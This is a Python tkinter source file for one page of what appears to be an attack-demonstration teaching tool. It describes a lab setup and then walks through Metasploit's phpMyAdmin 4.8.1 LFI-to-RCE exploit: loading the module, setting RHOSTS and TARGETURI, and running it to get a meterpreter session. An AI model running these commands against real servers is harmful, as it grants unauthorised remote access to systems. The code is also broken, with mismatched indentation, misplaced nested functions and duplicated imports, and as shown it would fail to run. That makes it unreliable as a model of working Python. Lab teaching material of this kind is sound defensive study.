import tkinter as tk  # python 3
import os
import PySimpleGUI as sg
from tkinter import font as tkfont, ttk  # python 3*
from tkinter import font as tkfont
from tkinter import font, messagebox
from tkinter import *
from nav_bar import *
from subprocess import call, Popen, PIPE

class AttackVectorTen(tk.Frame):
  
    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        self.controller = controller
        framefont = tkfont.Font(family='Calibri', size=33, weight="bold")
        
        main_frame = tk.Frame(self)
        
        highlightFont = font.Font(family='Calibri', size=18)
        
        def load_terminal():
            p1 = Popen("exo-open --launch TerminalEmulator", stdout=PIPE, universal_newlines=True, shell=True).stdout
            
        def change_to_Step1():
            text = (
                "\nStep 1: Setup environment (the following setup was used in this demonstration)\n\n"
                "o phpMyAdmin 4.8.1\n\n"
                "o Windows 7\n\n"
                "o Kali Linux\n\n"
                "o XAMPP 7.2.0 (used to run phpMyAdmin on the Windows 7 machine)\n\n"
                "o Metasploit\n\n"
                "o Windows 7 and Kali Linux is configured to be in the same internal network.\n\n"
            
          )
          step1frame = tk.Message(main_frame, text=text, fg='black', bg='white', font=('Calibri', 20), anchor='nw',
                                    aspect=300)
          step1frame.place(rely=0.2, relx=0.2, relheight=1, relwidth=1)
          
          def change_to_Step2():
              text = (
                  "\nStep 2: Walkthrough\n\n"
                  "o On the windows machine, make sure that you are running and logged into phpMyAdmin.\n\n"
                  "o Open terminal on Kali Linux and run metaploit using this command:\n"
                  "     msfconsole\n\n"
                  "o Load the exploit using:\n"
                  "     use exploit/multi/http/phpmyadmin_lfi_rce\n\n"
                  "o You are now required to enter the RHOSTS (Victim's IP address) and TARGETURI (name of the folder you have installed phpmyadmin 4.8.1 in).\n\n"
                  "o Use the following commands to set RHOSTS and TARGETURI:\n"
                  "     set RHOSTS 192.168.68.117\n"
                  "     set TARGETURI /phpmyadmin4.8.1/\n\n"
                  "o (IP address and folder name is just and example. Please modify accordingy)\n\n"
                  "o Finally run the exploit using:\n"
                  "     run\n\n"
                  "o If successfull, a meterpreter session should be created and the RCE attack is complete.\n\n"
                
          )
          step2frame = tk.Message(main_frame, text=text, fg='black', bg='white', font=('Calibri', 20), anchor='nw',
                                    aspect=300)
          step2frame.place(rely=0.2, relx=0.2, relheight=1, relwidth=1)    
                  
                 
               
        
